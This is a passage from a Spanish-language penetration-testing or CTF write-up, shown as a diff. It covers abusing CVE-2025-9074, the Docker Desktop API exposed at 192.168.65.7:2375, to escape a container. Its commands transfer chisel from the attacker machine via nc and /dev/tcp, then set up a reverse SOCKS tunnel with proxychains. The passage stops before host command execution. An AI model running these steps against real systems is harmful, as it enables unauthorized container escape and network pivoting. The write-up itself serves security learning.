@@ -186,4 +186,71 @@ Además en el directorio ***`/home`*** encontramos el homedirectory del usuario 
 
 ![[Pasted image 20260525010456.png]]
 
+Teniendo en cuenta que estamos en un contenedor que a su ves esté siendo ejecutado en un WSL2 (porque estamos en una maquina windows), lo mas probable es que por detras se esté desplegando Docker Desktop, buscando de forma rapida encontre lo siguiente:
+
+![[Pasted image 20260525234134.png]]
+
+Parece que hay una vulnerabilidad catalogada como [CVE-2025-9074](https://socprime.com/blog/cve-2025-9074-docker-desktop-vulnerability/), que basicamente consiste en que la API de docker está expuesta para el contenedor accediendo a la subnet interna por defecto (192.168.65.7:2375), intentemos v er si podemos interactuar con esta API para confirmar la vulnerabilidad, podemos usar curl:
+
+```bash
+curl http://192.168.65.7:2375/version
+```
+
+![[Pasted image 20260526000656.png]]
+
+Interactuar con la API de docker es basicamente tener control total sobre crear contenedores, eliminarlos y administrarlos, basicamente todo lo que puedes llegar a  hacer con por ejemplo el comando docker (Docker CLI), esto es porque el comando docker o el propio docker desktop no hacen mas que interactuar con esta API REST, hay dos opciones en este caso:
+
+1. Pivotear nuestras conexiones y usar el comando de docker en nuestra maquina atacante para que interactue con esta api expuesta
+
+2. Hacer las peticiones directamente con curl
+
+# Pivoting con Chisel
+
+#### Trasferir chisel
+
+***`En maquina atacante`***:
+
+```ruby
+nc -lvnp 8888 < chisel
+```
+
+***`En maquina victima`***:
+
+```ruby
+cat < /dev/tcp/{IP_ATACANTE}/{PUERTO} > chisel 
+```
+
+# Establecer tunel
+
+***`En maquina atacante`***:
+
+```ruby
+sudo chisel server --reverse -p 9090
+```
+
+**`!!IMPORTANTE!!`**:  Establecer al final de /etc/proxychains4.conf y  /etc/proxychains4.conf la linea:
+
+```ruby
+socks5   127.0.0.1   1080
+```
+
+***`En maquina victima`***:
+
+```ruby
+./chisel client {IP_TACANTE}:9090
+```
+
+El resultado deberia verse asi:
+
+![[Pasted image 20260526003359.png]]
+
+![[Pasted image 20260526003326.png]]
+
+Ahora podemos usar proxychains, comprobemos que todo esté funcionando correctamente:
+
+![[Pasted image 20260526003610.png]]
+
+Como podemos ver, el tunel está funcionando perfectamente, intentemos usar el coamndo docker para interactuar con esta API y ejecutar comandos en el sistema host:
+
+
 
